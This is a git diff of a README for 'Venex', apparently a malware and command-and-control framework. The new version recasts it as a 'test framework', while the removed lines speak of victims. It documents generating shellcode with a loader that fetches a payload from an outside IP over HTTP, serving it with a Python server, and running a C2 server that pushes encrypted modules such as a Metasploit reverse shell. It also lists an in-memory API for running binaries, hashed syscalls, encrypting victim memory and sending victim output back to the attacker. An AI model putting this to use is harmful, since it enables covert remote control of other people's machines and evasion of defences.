@@ -1,37 +1,76 @@
-# Venex
-;first i want to say you my english is not perfect
-;this is 0.2 test version we will upgrade
+# Venex 0.4 Test Version
 
-## HOW DO I USE THIS
-;first we will look at file structers or user im not gonne tell you sorce code if you are new to hacking dont look at /gostinit
-;your role is mostly inside /tools/bin this contain all tool you need
+> Note: English is not perfect, but this README will guide you through usage and structure.
 
-;encrypt.exe --> dont touch unless you make module for this
-;obufcater.exe --> dont touch unless you make module for this
-;hash.exe --> dont touch unless you make module for this
-;gostmsf.exe --> this is the tool you can generate shellcode(not just a shellcode it is core we call it shellcode engine), test/debug loader
+## Overview
 
-## HOW DO I USE gostmsf (msf mean not metasploit just chill)
-;just run ./gostmsf.exe "c2 Ip adress port is 80" "curl string for loader ex: http://99.88.77.66:5555/core.bin" then you will see things
-;core part is store inside /xMain/core/core.bin run http server inside /xMain/core/ for example : python -m http.server 5555 
+Venex is a test framework (v0.4) for creating and handling modules, shellcode, and encrypted payloads. This is an early version, so some functionality is limited.
 
-;then run c2 /server/server.exe this is not full server simple testing server just send encrypted module(not safe module just msf revshellcode 74 byte) to core
+### Directory Structure
 
-## HOW DO I MAKE MODULES FOR THIS (< 512b)
+* `/gostinit` - Contains initialization files (source code not provided; only for experienced users).
+* `/tools/bin` - Main tools you will use.
 
-;this is proved a function remember this is version 0.1 still test stage it mean only few functions
-;every function have MBA(module base adress) it mean if adress is function adress is -5
-;you can aceess it from your module start rip-5
+### Tools
 
+| Tool             | Description                           | Note                                                |
+| ---------------- | ------------------------------------- | --------------------------------------------------- |
+| `encrypt.exe`    | Encrypt data                          | Do not touch unless making a module                 |
+| `obfuscater.exe` | Obfuscate data                        | Do not touch unless making a module                 |
+| `hash.exe`       | Generate hashes                       | Do not touch unless making a module                 |
+| `gostmsf.exe`    | Generate shellcode (Shellcode Engine) | This is the main tool for testing/debugging loaders |
 
-;gostPrint(&message,len):0xFFFFF9CD this is printf but print victim output on server
+## Using `gostmsf.exe`
 
-;gostGetSyscall(syscallhash):0xFFFFF95A you dont need to do mov rax,syscallnumber alway use this
+Command syntax:
 
-;gostEXESyscall():0xFFFFFA8E you dont need to hardcode syscall instruction just call gostEXESyscall()
+```bash
+./gostmsf.exe "c2 IP_ADDRESS PORT" "curl string for loader e.g. http://99.88.77.66:5555/core.bin"
+```
 
-;gostEncrypt(&buffer,len):0xFFFFFAA6 you can encrypt eny memory value inside victime memory
+* Core part stored in: `/xMain/core/core.bin`
+* Run a simple HTTP server to serve core:
 
-;WARNING: gostPrint() is internely encrypt data you can pass unencrypted string
+```bash
+python -m http.server 5555
+```
 
-;after compiled binary sing with signatuer or turn on dinamicaly sign on server.exe
+* Start C2 testing server:
+
+```bash
+c2 /server/server.exe
+```
+
+> Note: Server only sends encrypted module (e.g., msf revshellcode, 74 bytes). Not safe for production.
+
+## Creating Modules (<512 bytes)
+
+* Limited functionality, v0.1 tested.
+* Each function has an MBA (Module Base Address).
+
+  * Address of function = function address - 5
+
+### API Table
+
+| Index | Function       | Description                                |
+| ----- | -------------- | ------------------------------------------ |
+| 0     | base           | Helps calculate address: `base + func RVA` |
+| 1     | gostEncrypt    | Encrypt anything                           |
+| 2     | gostExecute    | Execute any binary                         |
+| 3     | gostGetSyscall | Get syscall number                         |
+| 4     | gostEXESyscall | Execute syscall instruction                |
+| 5     | gostPrint      | Print to client (secure, encrypted)        |
+| 6     | gostSend       | Same as gostPrint                          |
+
+### Calling Functions
+
+* `rax` points to API table structure.
+* Example call:
+
+```nasm
+mov rbp, [rax + <index>*8]  ; Load function pointer
+add rbp, [rax]               ; Calculate final address
+call rbp                     ; Call the function
+```
+
+> End of README for Venex 0.4 Test Version.
